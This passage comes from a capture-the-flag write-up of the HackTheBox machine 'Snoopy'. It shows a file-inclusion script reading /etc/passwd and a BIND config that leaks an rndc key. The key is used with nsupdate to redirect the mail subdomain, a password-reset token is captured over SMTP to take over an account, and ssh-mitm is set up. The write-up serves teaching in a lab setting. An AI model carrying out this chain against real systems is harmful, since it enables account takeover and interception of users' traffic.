
<span class="w">    </span>main<span class="o">()</span>
</code></pre><br style="line-height: 0.5;"/></div>

We execute the script to verify that it works:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="err">@</span><span class="n">kali</span><span class="o">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">lfi</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span><span class="w"> </span><span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span><span class="w"> </span><span class="n">System</span><span class="w"> </span><span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Network</span><span class="w"> </span><span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">104</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Time</span><span class="w"> </span><span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">pollinate</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">1</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">usbmux</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="n">usbmux</span><span class="w"> </span><span class="n">daemon</span><span class="p">,,,:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">usbmux</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">cbrown</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">Charlie</span><span class="w"> </span><span class="n">Brown</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cbrown</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">sbrown</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="n">Sally</span><span class="w"> </span><span class="n">Brown</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sbrown</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">clamav</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1002</span><span class="p">:</span><span class="mi">1003</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">clamav</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lpelt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1003</span><span class="p">:</span><span class="mi">1004</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">lpelt</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">cschultz</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1004</span><span class="p">:</span><span class="mi">1005</span><span class="p">:</span><span class="n">Charles</span><span class="w"> </span><span class="n">Schultz</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cschultz</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">vgray</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1005</span><span class="p">:</span><span class="mi">1006</span><span class="p">:</span><span class="n">Violet</span><span class="w"> </span><span class="n">Gray</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vgray</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">bind</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">113</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">bind</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_laurel</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">998</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">laurel</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
</code></pre><br style="line-height: 0.5;"/></div>

Now, in an automated fashion, we can access files on the victim machine's system.<br/><br/>
After conducting extensive research within the system, it occurred to me to start listing files related to the DNS service on the system. Considering what we've observed, they were making changes to the DNS records, and the specific service they are using is BIND.<br/><br/>
We attempt to access the file <code>/etc/bind/named.conf</code>:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">lfi</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">bind</span><span class="o">/</span><span class="n">named</span><span class="p">.</span><span class="n">conf</span>
<span class="o">//</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">primary</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">BIND</span><span class="w"> </span><span class="n">DNS</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">named</span><span class="p">.</span>
<span class="o">//</span>
<span class="o">//</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="k">read</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">bind9</span><span class="o">/</span><span class="n">README</span><span class="p">.</span><span class="n">Debian</span><span class="p">.</span><span class="n">gz</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span>
<span class="o">//</span><span class="w"> </span><span class="k">structure</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">BIND</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">Debian</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="k">BEFORE</span><span class="o">*</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">customize</span><span class="w"> </span>
<span class="o">//</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="k">file</span><span class="p">.</span>
<span class="o">//</span>
<span class="o">//</span><span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">just</span><span class="w"> </span><span class="n">adding</span><span class="w"> </span><span class="n">zones</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">bind</span><span class="o">/</span><span class="n">named</span><span class="p">.</span><span class="n">conf</span><span class="p">.</span><span class="k">local</span>

<span class="k">include</span><span class="w"> </span><span class="ss">"/etc/bind/named.conf.options"</span><span class="p">;</span>
<span class="k">include</span><span class="w"> </span><span class="ss">"/etc/bind/named.conf.local"</span><span class="p">;</span>
<span class="k">include</span><span class="w"> </span><span class="ss">"/etc/bind/named.conf.default-zones"</span><span class="p">;</span>

<span class="k">key</span><span class="w"> </span><span class="ss">"rndc-key"</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="n">algorithm</span><span class="w"> </span><span class="n">hmac</span><span class="o">-</span><span class="n">sha256</span><span class="p">;</span>
<span class="w">    </span><span class="n">secret</span><span class="w"> </span><span class="ss">"BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="</span><span class="p">;</span>
<span class="err">}</span><span class="p">;</span>
</code></pre><br style="line-height: 0.5;"/></div>

We obtained highly relevant information, as with this information, we can change the DNS Zone:<br/><br/>
<div class="codehilite"><pre><span></span><code>key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
</code></pre><br style="line-height: 0.5;"/></div>

Using the <code>nsupdate</code> tool and the information we obtained, we can attempt to alter the DNS Zone. First, I stored the key in a file named <code>key</code>, and then I executed the following command:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">nsupdate</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="k">key</span>
<span class="o">&gt;</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

It appears that the key worked, so we can begin to change DNS records. To understand what we will attempt to do, we need to know what a DNS record is.<br/><br/>
In brief, a DNS (Domain Name System) record is an entry in a database that associates a domain name (such as example.com) with an IP address.<br/><br/>
<h3><br>DNS Record</br></h3><br>
Our goal is to alter a DNS record to make the subdomain <code>mail.snoopy.htb</code> point to our IP address because on our machine, we will run an SMTP server to see what information is transmitted behind the scenes.<br/><br/>
Why are we doing this? As we recall, on the <code>mm.snoopy.htb</code> subdomain, there was an option to reset the password.<br/><br/>
When you entered an email address and submitted the request, it appears that the server behind the scenes sent an email to the entered email address to reset the password.<br/><br/>
As we were informed that the <code>mailserver</code> (the mail server associated with the <code>mail.snoopy.htb</code> subdomain) was out of service, we can attempt to "hijack" the request or email that will be sent to the email address we enter in order to attempt a password reset for a valid user. We will achieve all of this by changing the DNS records, forcing the <code>mail.snoopy.htb</code> subdomain to point to our attacker IP.<br/><br/>
To obtain a valid user, it occurred to me to use a system-level username. In my case, I chose the username <code>sbrown</code>.<br/><br/>
First, we add the DNS record:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">nsupdate</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="k">key</span>
<span class="o">&gt;</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="mf">10.10.11.212</span>
<span class="o">&gt;</span><span class="w"> </span><span class="k">zone</span><span class="w"> </span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span>
<span class="o">&gt;</span><span class="w"> </span><span class="k">update</span><span class="w"> </span><span class="k">ADD</span><span class="w"> </span><span class="n">mail</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="ow">IN</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="mf">10.10.16.3</span>
<span class="o">&gt;</span><span class="w"> </span><span class="n">send</span>
</code></pre><br style="line-height: 0.5;"/></div>

We set up the SMTP server:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nd">@kali</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="mf">.11</span><span class="o">/</span><span class="n">smtpd</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">c</span> <span class="n">DebuggingServer</span> <span class="mf">10.10.16.3</span><span class="p">:</span><span class="mi">25</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="mf">.11</span><span class="o">/</span><span class="n">smtpd</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">96</span><span class="p">:</span> <span class="ne">DeprecationWarning</span><span class="p">:</span> <span class="n">The</span> <span class="n">asyncore</span> <span class="n">module</span> <span class="ow">is</span> <span class="n">deprecated</span> <span class="ow">and</span> <span class="n">will</span> <span class="n">be</span> <span class="n">removed</span> <span class="ow">in</span> <span class="n">Python</span> <span class="mf">3.12</span><span class="o">.</span> <span class="n">The</span> <span class="n">recommended</span> <span class="n">replacement</span> <span class="ow">is</span> <span class="n">asyncio</span>
  <span class="kn">import</span> <span class="nn">asyncore</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="mf">.11</span><span class="o">/</span><span class="n">smtpd</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span> <span class="ne">DeprecationWarning</span><span class="p">:</span> <span class="n">The</span> <span class="n">asynchat</span> <span class="n">module</span> <span class="ow">is</span> <span class="n">deprecated</span> <span class="ow">and</span> <span class="n">will</span> <span class="n">be</span> <span class="n">removed</span> <span class="ow">in</span> <span class="n">Python</span> <span class="mf">3.12</span><span class="o">.</span> <span class="n">The</span> <span class="n">recommended</span> <span class="n">replacement</span> <span class="ow">is</span> <span class="n">asyncio</span>
  <span class="kn">import</span> <span class="nn">asynchat</span>
<span class="n">DebuggingServer</span> <span class="n">started</span> <span class="n">at</span> <span class="n">Sat</span> <span class="n">Sep</span> <span class="mi">23</span> <span class="mi">09</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">53</span> <span class="mi">2023</span>
    <span class="n">Local</span> <span class="n">addr</span><span class="p">:</span> <span class="p">(</span><span class="s1">'10.10.16.3'</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
    <span class="n">Remote</span> <span class="n">addr</span><span class="p">:(</span><span class="s1">'localhost'</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
</code></pre><br style="line-height: 0.5;"/></div>

We send the password reset request on the <code>mm.snoopy.htb</code> subdomain:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/6.png"/><br/><br/>
We receive the following on our SMTP server:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="o">----------</span><span class="w"> </span><span class="n">MESSAGE</span><span class="w"> </span><span class="n">FOLLOWS</span><span class="w"> </span><span class="o">----------</span>
<span class="n">mail</span><span class="w"> </span><span class="nl">options</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">'BODY=8BITMIME'</span><span class="o">]</span>
<span class="n">b</span><span class="s1">'MIME-Version: 1.0'</span>
<span class="n">b</span><span class="s1">'Precedence: bulk'</span>
<span class="n">b</span><span class="s1">'From: "No-Reply" &lt;no-reply@snoopy.htb&gt;'</span>
<span class="n">b</span><span class="s1">'To: sbrown@snoopy.htb'</span>
<span class="n">b</span><span class="s1">'Content-Transfer-Encoding: 8bit'</span>
<span class="n">b</span><span class="s1">'Date: Sat, 23 Sep 2023 12:37:24 +0000'</span>
<span class="n">b</span><span class="s1">'Auto-Submitted: auto-generated'</span>
<span class="n">b</span><span class="s1">'Message-ID: &lt;orjog63jin8qgezk-1695472644@mm.snoopy.htb&gt;'</span>
<span class="n">b</span><span class="s1">'Subject: [Mattermost] Reset your password'</span>
<span class="n">b</span><span class="s1">'Reply-To: "No-Reply" &lt;no-reply@snoopy.htb&gt;'</span>
<span class="n">b</span><span class="s1">'Content-Type: multipart/alternative;'</span>
<span class="n">b</span><span class="s1">' boundary=b9c1deb3e3fb199a334a6ae1e70c303b066764691ac36797cd0d7ca0f7c9'</span>
<span class="n">b</span><span class="s1">'X-Peer: 10.10.11.212'</span>
<span class="n">b</span><span class="s1">''</span>
<span class="n">b</span><span class="s1">'--b9c1deb3e3fb199a334a6ae1e70c303b066764691ac36797cd0d7ca0f7c9'</span>
<span class="n">b</span><span class="s1">'Content-Transfer-Encoding: quoted-printable'</span>
<span class="n">b</span><span class="s1">'Content-Type: text/plain; charset=UTF-8'</span>
<span class="n">b</span><span class="s1">''</span>
<span class="n">b</span><span class="s1">'Reset Your Password'</span>
<span class="n">b</span><span class="s1">'Click the button below to reset your password. If you didn=E2=80=99t reques='</span>
<span class="n">b</span><span class="s1">'t this, you can safely ignore this email.'</span>
<span class="n">b</span><span class="s1">''</span>
<span class="n">b</span><span class="s1">'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dm3xfp='</span>
<span class="n">b</span><span class="s1">'194gnkpffxuumgj1ypj56rshjmsoxmroipshj4orj5umdyx6wdr4rb1tjty )'</span>
<span class="n">b</span><span class="s1">''</span>
<span class="n">b</span><span class="s1">'The password reset link expires in 24 hours.'</span>
<span class="p">............</span>
<span class="p">............</span>
<span class="p">............</span>
</code></pre><br style="line-height: 0.5;"/></div>

We have successfully "hijacked" the request by altering the DNS records, and now we can attempt to change the password for the user <code>sbrown</code> using the link provided with a token.<br/><br/>
We adapt the format of the link by removing the URL-encoded characters:<br/><br/>
<div class="codehilite"><pre><span></span><code>http://mm.snoopy.htb/reset_password_complete?token=m3xfp194gnkpffxuumgj1ypj56rshjmsoxmroipshj4orj5umdyx6wdr4rb1tjty
</code></pre><br style="line-height: 0.5;"/></div>

We check if it allows us to change the password for the user <code>sbrown</code> by accessing the link:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/7.png"/><br/><br/>
We successfully changed the password for the user <code>sbrown</code>, and we can now try testing the credentials on the authentication panel.<br/><br/>
<h3><br>Shell as cbrown</br></h3><br>
After entering the credentials we obtained, we successfully access the Mattermost chat:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/8.png"/><br/><br/>
If we enter a <code>/</code>, we are shown a list of what appears to be commands that we can execute:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/9.png"/><br/><br/>
Reading through all the commands, one command catches my attention, which doesn't have a description:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/10.png"/><br/><br/>
When executing the <code>server_provision</code> command, a window is displayed that allows us to enter certain data:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/11.png"/><br/><br/>
I tried entering specific data to see what would happen:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/12.png"/><br/><br/>
After sending this data, the user <code>cbrown</code> sent me a private message with the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/13.png"/><br/><br/>
The user <code>cbrown</code> is asking if the machine is online, and this is likely because they are trying to make a request to my IP on port 2222, as we specified in the form.<br/><br/>
Another option, apart from port 2222, is port 5985, which is associated with the Windows WinRM service, but in this case, it is disabled.<br/><br/>
It seems that the victim machine, because we specified <code>Linux - TCP/2222</code> and my attacker IP <code>10.10.16.3</code>, is attempting SSH requests to my machine on port 2222.<br/><br/>
We can try to capture the SSH request that the victim machine is making using the <a href="https://github.com/ssh-mitm/ssh-mitm">ssh-mitm</a> tool.<br/><br/>
First, we set up an <code>ssh-mitm</code> server on port <code>2222</code>, specifying the IP of the victim machine:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="nx">elswix</span><span class="err">@</span><span class="nx">kali</span><span class="err">$</span><span class="w"> </span><span class="nx">ssh</span><span class="o">-</span><span class="nx">mitm</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="o">--</span><span class="nx">remote</span><span class="o">-</span><span class="nx">host</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">12</span><span class="w"> </span><span class="o">--</span><span class="nx">listen</span><span class="o">-</span><span class="nx">port</span><span class="w"> </span><span class="mi">2222</span>
